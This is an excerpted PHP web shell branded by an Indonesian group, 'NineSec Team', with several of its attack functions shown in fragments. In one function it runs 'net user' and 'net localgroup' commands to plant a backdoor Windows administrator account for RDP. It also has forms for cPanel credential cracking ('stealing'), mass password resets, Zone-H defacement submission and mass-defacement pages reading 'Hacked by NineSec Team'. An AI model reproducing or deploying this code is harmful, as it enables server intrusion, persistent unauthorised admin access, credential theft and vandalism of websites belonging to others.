...
// Tapi Selebihnya, itu hasil kreasi NineSec Team sendiri.
// Tanpa kalian kita tidak akan BESAR seperti sekarang.
// Greetz: All Member NineSec Team. & All My Friends.
// Recode By : FarelNineSec
###############################################################################
...
<head>
<title>NineSec Team</title>
<meta name='author' content='NineSec Team'>
<meta charset="UTF-8">
<style type='text/css'>
...
function tools($toolsname, $args = null) {
	...
	elseif($toolsname === "idxconfig") {
		...
		if(!is_dir(path()."/idx_config/")) {
			...
			$htaccess = "Options all\nDirectoryIndex NineSec Team.htm\nSatisfy Any";
	...
	elseif($toolsname === "krdp") {
		...
		if(preg_match("/NineSec Team/", exe("net user"))) die(color(1, 1, "[INFO] username 'NineSec Team' already exists."));

		$add_user   = exe("net user NineSec Team NineSec Team /add");
    	$add_groups1 = exe("net localgroup Administrators NineSec Team /add");
    	$add_groups2 = exe("net localgroup Administrator NineSec Team /add");
    	$add_groups3 = exe("net localgroup Administrateur NineSec Team /add");

    	print "[ RDP ACCOUNT INFO ]<br>
    	------------------------------<br>
    	IP: ".color(1, 2, $GLOBALS['SERVERIP'])."<br>
    	Username: ".color(1, 2, "NineSec Team")."<br>
    	Password: ".color(1, 2, "NineSec Team")."<br>
    	------------------------------<br><br>
    	[ STATUS ]<br>
    	------------------------------<br>
    	";
...
function files_and_folder() {
	...
	print "</table>";
	print "<center>Copyright &copy; ".date("Y")." - <a href='http://NineSec Team.or.id/' target='_blank'>".color(1, 2, "NineSec Team")."</a></center>";
}
	...
	if(isset($_GET['do'])) {
		...
		elseif($_GET['do'] === "zoneh") {
			if(isset($_POST['submit']) AND $_GET['do'] === "zoneh") {
				...
				print "<center><form method='post' action='?do=zoneh&dir=".path()."'>
		    	       Defacer: <br>
		    	       <input type='text' name='nick' size='50' value='NineSec Team'><br><br>
		    	       Domains: <br>
		...
		elseif($_GET['do'] == 'cpanel') {
			if($_POST['crack']) {
				...
				print ($i === 0) ? "" : "<p>".color(1, 3, "Sukses nyolong $i Cpanel by NineSec Team")."</p>";
			} else {
				print "<center>
		...
		elseif($_GET['do'] == 'mpc') {
			if($_POST['hajar']) {
				...
				Set User & Pass: <br>
				<input type='text' name='user_baru' value='NineSec Team' placeholder='user_baru'><br>
				<input type='text' name='pass_baru' value='NineSec Team' placeholder='pass_baru'><br>
		...
		elseif($_GET['do'] === "mass") {
			if($_POST['start']) {
				...
				print "<center><form method='post'>
					   ...
					   <textarea name='script' style='width: 450px; height: 200px;'>Hacked by NineSec Team</textarea><br>
